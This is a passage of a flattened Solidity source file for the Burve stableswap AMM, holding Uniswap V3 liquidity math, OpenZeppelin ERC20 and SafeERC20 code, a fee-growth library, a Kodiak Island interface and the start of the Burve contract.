        if (sqrtRatioX96 <= sqrtRatioAX96) {
            amount0 = getAmount0ForLiquidityRoundingUp(
                sqrtRatioAX96,
                sqrtRatioBX96,
                liquidity
            );
        } else if (sqrtRatioX96 < sqrtRatioBX96) {
            amount0 = getAmount0ForLiquidityRoundingUp(
                sqrtRatioX96,
                sqrtRatioBX96,
                liquidity
            );
            amount1 = getAmount1ForLiquidityRoundingUp(
                sqrtRatioAX96,
                sqrtRatioX96,
                liquidity
            );
        } else {
            amount1 = getAmount1ForLiquidityRoundingUp(
                sqrtRatioAX96,
                sqrtRatioBX96,
                liquidity
            );
        }
    }
}

// lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol

// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/ERC20.sol)

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC-20
 * applications.
 */
abstract contract ERC20 is Context, IERC20_1, IERC20Metadata, IERC20Errors {
    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `value`.
     */
    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Skips emitting an {Approval} event indicating an allowance update. This is not
     * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    /**
     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     *
     * ```solidity
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `value`.
     *
     * Does not update the allowance value in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}

// lib/openzeppelin-contracts/contracts/interfaces/IERC1363.sol

// OpenZeppelin Contracts (last updated v5.1.0) (interfaces/IERC1363.sol)

/**
 * @title IERC1363
 * @dev Interface of the ERC-1363 standard as defined in the https://eips.ethereum.org/EIPS/eip-1363[ERC-1363].
 *
 * Defines an extension interface for ERC-20 tokens that supports executing code on a recipient contract
 * after `transfer` or `transferFrom`, or code on a spender contract after `approve`, in a single transaction.
 */
interface IERC1363 is IERC20_1, IERC165_1 {
    /*
     * Note: the ERC-165 identifier for this interface is 0xb0202a11.
     * 0xb0202a11 ===
     *   bytes4(keccak256('transferAndCall(address,uint256)')) ^
     *   bytes4(keccak256('transferAndCall(address,uint256,bytes)')) ^
     *   bytes4(keccak256('transferFromAndCall(address,address,uint256)')) ^
     *   bytes4(keccak256('transferFromAndCall(address,address,uint256,bytes)')) ^
     *   bytes4(keccak256('approveAndCall(address,uint256)')) ^
     *   bytes4(keccak256('approveAndCall(address,uint256,bytes)'))
     */

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`
     * and then calls {IERC1363Receiver-onTransferReceived} on `to`.
     * @param to The address which you want to transfer to.
     * @param value The amount of tokens to be transferred.
     * @return A boolean value indicating whether the operation succeeded unless throwing.
     */
    function transferAndCall(address to, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`
     * and then calls {IERC1363Receiver-onTransferReceived} on `to`.
     * @param to The address which you want to transfer to.
     * @param value The amount of tokens to be transferred.
     * @param data Additional data with no specified format, sent in call to `to`.
     * @return A boolean value indicating whether the operation succeeded unless throwing.
     */
    function transferAndCall(address to, uint256 value, bytes calldata data) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism
     * and then calls {IERC1363Receiver-onTransferReceived} on `to`.
     * @param from The address which you want to send tokens from.
     * @param to The address which you want to transfer to.
     * @param value The amount of tokens to be transferred.
     * @return A boolean value indicating whether the operation succeeded unless throwing.
     */
    function transferFromAndCall(address from, address to, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism
     * and then calls {IERC1363Receiver-onTransferReceived} on `to`.
     * @param from The address which you want to send tokens from.
     * @param to The address which you want to transfer to.
     * @param value The amount of tokens to be transferred.
     * @param data Additional data with no specified format, sent in call to `to`.
     * @return A boolean value indicating whether the operation succeeded unless throwing.
     */
    function transferFromAndCall(address from, address to, uint256 value, bytes calldata data) external returns (bool);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens and then calls {IERC1363Spender-onApprovalReceived} on `spender`.
     * @param spender The address which will spend the funds.
     * @param value The amount of tokens to be spent.
     * @return A boolean value indicating whether the operation succeeded unless throwing.
     */
    function approveAndCall(address spender, uint256 value) external returns (bool);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens and then calls {IERC1363Spender-onApprovalReceived} on `spender`.
     * @param spender The address which will spend the funds.
     * @param value The amount of tokens to be spent.
     * @param data Additional data with no specified format, sent in call to `spender`.
     * @return A boolean value indicating whether the operation succeeded unless throwing.
     */
    function approveAndCall(address spender, uint256 value, bytes calldata data) external returns (bool);
}

// src/single/integrations/kodiak/IUniswapV3Pool.sol

/// @title The interface for a Uniswap V3 Pool
/// @notice A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform
/// to the ERC20 specification
/// @dev The pool interface is broken up into many smaller pieces
interface IUniswapV3Pool is
    IUniswapV3PoolImmutables,
    IUniswapV3PoolState,
    IUniswapV3PoolDerivedState,
    IUniswapV3PoolActions,
    IUniswapV3PoolOwnerActions,
    IUniswapV3PoolEvents
{}

// lib/openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/utils/SafeERC20.sol)

/**
 * @title SafeERC20
 * @dev Wrappers around ERC-20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeERC20 {
    /**
     * @dev An operation with an ERC-20 token failed.
     */
    error SafeERC20FailedOperation(address token);

    /**
     * @dev Indicates a failed `decreaseAllowance` request.
     */
    error SafeERC20FailedDecreaseAllowance(address spender, uint256 currentAllowance, uint256 requestedDecrease);

    /**
     * @dev Transfer `value` amount of `token` from the calling contract to `to`. If `token` returns no value,
     * non-reverting calls are assumed to be successful.
     */
    function safeTransfer(IERC20_1 token, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeCall(token.transfer, (to, value)));
    }

    /**
     * @dev Transfer `value` amount of `token` from `from` to `to`, spending the approval given by `from` to the
     * calling contract. If `token` returns no value, non-reverting calls are assumed to be successful.
     */
    function safeTransferFrom(IERC20_1 token, address from, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeCall(token.transferFrom, (from, to, value)));
    }

    /**
     * @dev Increase the calling contract's allowance toward `spender` by `value`. If `token` returns no value,
     * non-reverting calls are assumed to be successful.
     *
     * IMPORTANT: If the token implements ERC-7674 (ERC-20 with temporary allowance), and if the "client"
     * smart contract uses ERC-7674 to set temporary allowances, then the "client" smart contract should avoid using
     * this function. Performing a {safeIncreaseAllowance} or {safeDecreaseAllowance} operation on a token contract
     * that has a non-zero temporary allowance (for that particular owner-spender) will result in unexpected behavior.
     */
    function safeIncreaseAllowance(IERC20_1 token, address spender, uint256 value) internal {
        uint256 oldAllowance = token.allowance(address(this), spender);
        forceApprove(token, spender, oldAllowance + value);
    }

    /**
     * @dev Decrease the calling contract's allowance toward `spender` by `requestedDecrease`. If `token` returns no
     * value, non-reverting calls are assumed to be successful.
     *
     * IMPORTANT: If the token implements ERC-7674 (ERC-20 with temporary allowance), and if the "client"
     * smart contract uses ERC-7674 to set temporary allowances, then the "client" smart contract should avoid using
     * this function. Performing a {safeIncreaseAllowance} or {safeDecreaseAllowance} operation on a token contract
     * that has a non-zero temporary allowance (for that particular owner-spender) will result in unexpected behavior.
     */
    function safeDecreaseAllowance(IERC20_1 token, address spender, uint256 requestedDecrease) internal {
        unchecked {
            uint256 currentAllowance = token.allowance(address(this), spender);
            if (currentAllowance < requestedDecrease) {
                revert SafeERC20FailedDecreaseAllowance(spender, currentAllowance, requestedDecrease);
            }
            forceApprove(token, spender, currentAllowance - requestedDecrease);
        }
    }

    /**
     * @dev Set the calling contract's allowance toward `spender` to `value`. If `token` returns no value,
     * non-reverting calls are assumed to be successful. Meant to be used with tokens that require the approval
     * to be set to zero before setting it to a non-zero value, such as USDT.
     *
     * NOTE: If the token implements ERC-7674, this function will not modify any temporary allowance. This function
     * only sets the "standard" allowance. Any temporary allowance will remain active, in addition to the value being
     * set here.
     */
    function forceApprove(IERC20_1 token, address spender, uint256 value) internal {
        bytes memory approvalCall = abi.encodeCall(token.approve, (spender, value));

        if (!_callOptionalReturnBool(token, approvalCall)) {
            _callOptionalReturn(token, abi.encodeCall(token.approve, (spender, 0)));
            _callOptionalReturn(token, approvalCall);
        }
    }

    /**
     * @dev Performs an {ERC1363} transferAndCall, with a fallback to the simple {ERC20} transfer if the target has no
     * code. This can be used to implement an {ERC721}-like safe transfer that rely on {ERC1363} checks when
     * targeting contracts.
     *
     * Reverts if the returned value is other than `true`.
     */
    function transferAndCallRelaxed(IERC1363 token, address to, uint256 value, bytes memory data) internal {
        if (to.code.length == 0) {
            safeTransfer(token, to, value);
        } else if (!token.transferAndCall(to, value, data)) {
            revert SafeERC20FailedOperation(address(token));
        }
    }

    /**
     * @dev Performs an {ERC1363} transferFromAndCall, with a fallback to the simple {ERC20} transferFrom if the target
     * has no code. This can be used to implement an {ERC721}-like safe transfer that rely on {ERC1363} checks when
     * targeting contracts.
     *
     * Reverts if the returned value is other than `true`.
     */
    function transferFromAndCallRelaxed(
        IERC1363 token,
        address from,
        address to,
        uint256 value,
        bytes memory data
    ) internal {
        if (to.code.length == 0) {
            safeTransferFrom(token, from, to, value);
        } else if (!token.transferFromAndCall(from, to, value, data)) {
            revert SafeERC20FailedOperation(address(token));
        }
    }

    /**
     * @dev Performs an {ERC1363} approveAndCall, with a fallback to the simple {ERC20} approve if the target has no
     * code. This can be used to implement an {ERC721}-like safe transfer that rely on {ERC1363} checks when
     * targeting contracts.
     *
     * NOTE: When the recipient address (`to`) has no code (i.e. is an EOA), this function behaves as {forceApprove}.
     * Opposedly, when the recipient address (`to`) has code, this function only attempts to call {ERC1363-approveAndCall}
     * once without retrying, and relies on the returned value to be true.
     *
     * Reverts if the returned value is other than `true`.
     */
    function approveAndCallRelaxed(IERC1363 token, address to, uint256 value, bytes memory data) internal {
        if (to.code.length == 0) {
            forceApprove(token, to, value);
        } else if (!token.approveAndCall(to, value, data)) {
            revert SafeERC20FailedOperation(address(token));
        }
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     *
     * This is a variant of {_callOptionalReturnBool} that reverts if call fails to meet the requirements.
     */
    function _callOptionalReturn(IERC20_1 token, bytes memory data) private {
        uint256 returnSize;
        uint256 returnValue;
        assembly ("memory-safe") {
            let success := call(gas(), token, 0, add(data, 0x20), mload(data), 0, 0x20)
            // bubble errors
            if iszero(success) {
                let ptr := mload(0x40)
                returndatacopy(ptr, 0, returndatasize())
                revert(ptr, returndatasize())
            }
            returnSize := returndatasize()
            returnValue := mload(0)
        }

        if (returnSize == 0 ? address(token).code.length == 0 : returnValue != 1) {
            revert SafeERC20FailedOperation(address(token));
        }
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     *
     * This is a variant of {_callOptionalReturn} that silently catches all reverts and returns a bool instead.
     */
    function _callOptionalReturnBool(IERC20_1 token, bytes memory data) private returns (bool) {
        bool success;
        uint256 returnSize;
        uint256 returnValue;
        assembly ("memory-safe") {
            success := call(gas(), token, 0, add(data, 0x20), mload(data), 0, 0x20)
            returnSize := returndatasize()
            returnValue := mload(0)
        }
        return success && (returnSize == 0 ? address(token).code.length > 0 : returnValue == 1);
    }
}

// src/single/Fees.sol

// For handling binary fixed point numbers, see https://en.wikipedia.org/wiki/Q_(number_format)
// see UniswapV3 for more context https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FixedPoint128.sol
uint256 constant Q128 = 1 << 128;

library FeeLib {
    /// View only implemention to find the fees owed to a position
    /// @param pool that we are executing on
    /// @param tickLower of the position
    /// @param tickUpper of the position
    /// @param tickCurrent of the pool
    /// @param liquidity inside of the position
    /// @param feeGrowthInside0LastX128 of the position
    /// @param feeGrowthInside1LastX128 of the position
    function viewAccumulatedFees(
        IUniswapV3Pool pool,
        int24 tickLower,
        int24 tickUpper,
        int24 tickCurrent,
        uint128 liquidity,
        uint256 feeGrowthInside0LastX128,
        uint256 feeGrowthInside1LastX128
    ) internal view returns (uint128 tokensOwed0, uint128 tokensOwed1) {
        uint256 feeGrowthGlobal0X128 = pool.feeGrowthGlobal0X128();
        uint256 feeGrowthGlobal1X128 = pool.feeGrowthGlobal1X128();

        (
            uint256 feeGrowthInside0X128,
            uint256 feeGrowthInside1X128
        ) = getFeeGrowthInside(
                pool,
                tickLower,
                tickUpper,
                tickCurrent,
                feeGrowthGlobal0X128,
                feeGrowthGlobal1X128
            );

        // UniswapV3 makes the assumption that you would call collect again on overflow
        // We will make the same assumption given that (uint128).max of any token is a lot of fees
        // https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/libraries/Position.sol#L60
        tokensOwed0 = uint128(
            X128.mul256(
                liquidity,
                feeGrowthInside0X128 - feeGrowthInside0LastX128
            )
        );
        tokensOwed1 = uint128(
            X128.mul256(
                liquidity,
                feeGrowthInside1X128 - feeGrowthInside1LastX128
            )
        );
    }

    /// @notice Retrieves fee growth data
    /// @notice this is adapted from the feeGrowthInside function in the UniswapV3Pool contract
    /// @notice adapted from https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/Tick.sol
    /// @param pool The operation is taking place on
    /// @param tickLower The lower tick boundary of the position
    /// @param tickUpper The upper tick boundary of the position
    /// @param tickCurrent The current tick
    /// @param feeGrowthGlobal0X128 The all-time global fee growth, per unit of liquidity, in token0
    /// @param feeGrowthGlobal1X128 The all-time global fee growth, per unit of liquidity, in token1
    /// @return feeGrowthInside0X128 The all-time fee growth in token0, per unit of liquidity, inside the position's tick boundaries
    /// @return feeGrowthInside1X128 The all-time fee growth in token1, per unit of liquidity, inside the position's tick boundaries
    function getFeeGrowthInside(
        IUniswapV3Pool pool,
        int24 tickLower,
        int24 tickUpper,
        int24 tickCurrent,
        uint256 feeGrowthGlobal0X128,
        uint256 feeGrowthGlobal1X128
    )
        internal
        view
        returns (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128)
    {
        (
            ,
            ,
            uint256 lowerFeeGrowthOutside0X128,
            uint256 lowerFeeGrowthOutside1X128,
            ,
            ,
            ,

        ) = pool.ticks(tickLower);
        (
            ,
            ,
            uint256 upperFeeGrowthOutside0X128,
            uint256 upperFeeGrowthOutside1X128,
            ,
            ,
            ,

        ) = pool.ticks(tickUpper);

        unchecked {
            if (tickCurrent < tickLower) {
                feeGrowthInside0X128 =
                    lowerFeeGrowthOutside0X128 -
                    upperFeeGrowthOutside0X128;
                feeGrowthInside1X128 =
                    lowerFeeGrowthOutside1X128 -
                    upperFeeGrowthOutside1X128;
            } else if (tickCurrent < tickUpper) {
                feeGrowthInside0X128 =
                    feeGrowthGlobal0X128 -
                    lowerFeeGrowthOutside0X128 -
                    upperFeeGrowthOutside0X128;
                feeGrowthInside1X128 =
                    feeGrowthGlobal1X128 -
                    lowerFeeGrowthOutside1X128 -
                    upperFeeGrowthOutside1X128;
            } else {
                feeGrowthInside0X128 =
                    upperFeeGrowthOutside0X128 -
                    lowerFeeGrowthOutside0X128;
                feeGrowthInside1X128 =
                    upperFeeGrowthOutside1X128 -
                    lowerFeeGrowthOutside1X128;
            }
        }
    }
}

// src/single/integrations/kodiak/IKodiakIsland.sol

interface IKodiakIsland is
    IERC20_1,
    IUniswapV3MintCallback,
    IUniswapV3SwapCallback
{
    event Minted(
        address receiver,
        uint256 mintAmount,
        uint256 amount0In,
        uint256 amount1In,
        uint128 liquidityMinted
    );

    event Burned(
        address receiver,
        uint256 burnAmount,
        uint256 amount0Out,
        uint256 amount1Out,
        uint128 liquidityBurned
    );

    event Rebalance(
        address indexed compounder,
        int24 lowerTick_,
        int24 upperTick_,
        uint128 liquidityBefore,
        uint128 liquidityAfter
    );

    event FeesEarned(uint256 feesEarned0, uint256 feesEarned1);

    // User functions
    function mint(
        uint256 mintAmount,
        address receiver
    )
        external
        returns (uint256 amount0, uint256 amount1, uint128 liquidityMinted);

    event UpdateManagerParams(
        uint16 managerFeeBPS,
        address managerTreasury,
        uint16 compounderSlippageBPS,
        uint32 compounderSlippageInterval
    );
    event PauserSet(address indexed pauser, bool status);
    event RestrictedMintSet(bool status);

    function burn(
        uint256 burnAmount,
        address receiver
    )
        external
        returns (uint256 amount0, uint256 amount1, uint128 liquidityBurned);

    function updateManagerParams(
        int16 newManagerFeeBPS,
        address newManagerTreasury,
        int16 newSlippageBPS,
        int32 newSlippageInterval
    ) external;

    function setRestrictedMint(bool enabled) external;

    function setPauser(address _pauser, bool enabled) external;

    function pause() external;

    function unpause() external;

    function renounceOwnership() external;
    function transferOwnership(address newOwner) external;

    // Additional view functions that might be useful to expose:
    function managerBalance0() external view returns (uint256);

    function managerBalance1() external view returns (uint256);

    function managerTreasury() external view returns (address);

    function getUnderlyingBalancesAtPrice(
        uint160 sqrtRatioX96
    ) external view returns (uint256 amount0Current, uint256 amount1Current);
    function manager() external view returns (address);

    function getMintAmounts(
        uint256 amount0Max,
        uint256 amount1Max
    )
        external
        view
        returns (uint256 amount0, uint256 amount1, uint256 mintAmount);

    function getUnderlyingBalances()
        external
        view
        returns (uint256 amount0, uint256 amount1);

    function getPositionID() external view returns (bytes32 positionID);

    function token0() external view returns (IERC20_1);

    function token1() external view returns (IERC20_1);

    function upperTick() external view returns (int24);

    function lowerTick() external view returns (int24);

    function pool() external view returns (IUniswapV3Pool);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function managerFeeBPS() external view returns (uint16);

    function withdrawManagerBalance() external;

    function executiveRebalance(
        int24 newLowerTick,
        int24 newUpperTick,
        uint160 swapThresholdPrice,
        uint256 swapAmountBPS,
        bool zeroForOne
    ) external;

    function rebalance() external;

    function initialize(
        string memory _name,
        string memory _symbol,
        address _pool,
        uint16 _managerFeeBPS,
        int24 _lowerTick,
        int24 _upperTick,
        address _manager_
    ) external;
    function compounderSlippageInterval() external view returns (uint32);

    function compounderSlippageBPS() external view returns (uint16);

    function restrictedMint() external view returns (bool);
}

// src/single/Info.sol

/// Struct containing information for a Burve single pool.
struct Info {
    /// Uniswap pool.
    IUniswapV3Pool pool;
    /// Token0.
    IERC20_1 token0;
    /// Token1.
    IERC20_1 token1;
    /// Island.
    IKodiakIsland island;
    // Station proxy.
    IStationProxy stationProxy;
    /// Total nominal liquidity.
    uint128 totalNominalLiq;
    /// Total shares of nominal liquidity.
    uint256 totalShares;
    /// The n ranges.
    /// If there is an island that range lies at index 0, encoded as (0, 0).
    TickRange[] ranges;
    /// The relative liquidity for our n ranges.
    /// If there is an island that distribution lies at index 0.
    uint256[] distX96;
}

// src/single/Burve.sol

/// @notice A stableswap AMM for a pair of tokens that uses multiple concentrated Uni-V3 positions
/// to replicate a super-set of stableswap math and other swap curves more efficiently than a numeric solution does.
contract Burve is ERC20 {
    uint256 private constant X96_MASK = (1 << 96) - 1;
    uint256 private constant UNIT_NOMINAL_LIQ_X64 = 1 << 64;
    uint256 private constant MIN_DEAD_SHARES = 100;

    /// The v3 pool.
    IUniswapV3Pool public pool;
    /// The pool's token0.
    IERC20_1 public token0;
    /// The pool's token1.
    IERC20_1 public token1;
    /// The optional Kodiak island.
    IKodiakIsland public island;
    /// The station proxy.
    IStationProxy public stationProxy;
    /// The n ranges.
    /// If there is an island that range lies at index 0, encoded as (0, 0).
    TickRange[] public ranges;
    /// The relative liquidity for our n ranges.
    /// If there is an island that distribution lies at index 0.
    uint256[] public distX96;
    /// Total nominal liquidity.
    uint128 public totalNominalLiq;
    /// Total shares of nominal liquidity.
    uint256 public totalShares;
    // Total island shares.
    uint256 public totalIslandShares;
    /// Mapping of owner to island shares they own.
    mapping(address owner => uint256 islandShares) public islandSharesPerOwner;

    /// Emitted when shares are minted.
    event Mint(
        address indexed sender,
        address indexed recipient,
        uint256 shares,
        uint256 islandShares
    );
    /// Emitted when shares are burned.
    event Burn(address indexed owner, uint256 shares, uint256 islandShares);
    /// Emitted when the station proxy is migrated.
    event MigrateStationProxy(
        IStationProxy indexed from,
        IStationProxy indexed to
    );
    /// Emitted during compound if calculated nominal liquidity is infinite for both tokens,
    /// indicating a serious problem with the underlying pool or configuration of this contract.
    event MalformedPool();

    /// Thrown if the given tick range does not match the pools tick spacing.
    error InvalidRange(int24 lower, int24 upper);
    /// Thrown if an island is provided without the island range at index 0,
    /// if the island range at index 0 is provided without the island,
    /// or if an island range is given at an index other than 0.
    error InvalidIslandRange();
    /// Thrown if no ranges are provided.
    error NoRanges();
    /// Thrown when the provided island points to a pool that does not match the provided pool.
    error MismatchedIslandPool(address island, address pool);
    /// Thrown when the number of ranges and number of weights do not match.
    error MismatchedRangeWeightLengths(
        uint256 rangeLength,
        uint256 weightLength
    );
    /// If you burn too much liq at once, we can't collect that amount in one call.
    /// Please split up into multiple calls.
    error TooMuchBurnedAtOnce(uint128 liq, uint256 tokens, bool isX);
    /// Thrown during the uniswapV3MintCallback if the msg.sender is not the pool.
    /// Only the uniswap pool has permission to call this.
    error UniswapV3MintCallbackSenderNotPool(address sender);
    /// Thrown if the price of the pool has moved outside the accepted range during mint / burn.
    error SqrtPriceX96OverLimit(
        uint160 sqrtPriceX96,
        uint160 lowerSqrtPriceLimitX96,
        uint160 upperSqrtPriceLimitX96
    );
    /// Thrown if trying to migrate to the same station proxy.
    error MigrateToSameStationProxy();
    /// Thrown when the first mint is insufficient.
    error InsecureFirstMintAmount(uint256 shares);
    /// Thrown when the first mint is not deadshares.
    error InsecureFirstMintRecipient(address recipient);

    /// Modifier used to ensure the price of the pool is within the accepted lower and upper limits. When minting / burning.
    modifier withinSqrtPX96Limits(
        uint160 lowerSqrtPriceLimitX96,
        uint160 upperSqrtPriceLimitX96
    ) {
        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();
        if (
            sqrtRatioX96 < lowerSqrtPriceLimitX96 ||
            sqrtRatioX96 > upperSqrtPriceLimitX96
        ) {
            revert SqrtPriceX96OverLimit(
                sqrtRatioX96,
                lowerSqrtPriceLimitX96,
                upperSqrtPriceLimitX96
            );
        }

        _;
    }

    /// @param _pool The pool we are wrapping
    /// @param _island The optional island we are wrapping
    /// @param _ranges the n ranges
    /// @param _weights n weights defining the relative liquidity for each range.
    constructor(
        address _pool,
        address _island,
        address _stationProxy,
        TickRange[] memory _ranges,
        uint128[] memory _weights
    ) ERC20(nameFromPool(_pool), symbolFromPool(_pool)) {
        AdminLib.initOwner(msg.sender);

        pool = IUniswapV3Pool(_pool);
